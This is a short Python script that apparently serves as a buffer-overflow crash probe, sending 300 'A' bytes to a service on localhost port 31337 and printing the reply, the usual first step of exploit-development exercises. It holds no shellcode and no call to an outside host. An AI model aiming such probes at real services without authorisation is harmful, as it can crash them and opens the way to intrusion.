import socket

ip_addr = '127.0.0.1'
port = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload = b'A'*300

print('[>>] connecting...')
s.connect((ip_addr, port))

print('[>>] Sending payload...')
s.send(payload+b'\n')
print('[>>] Payload sent')

resp = s.recv(1024)
print(resp)

s.close()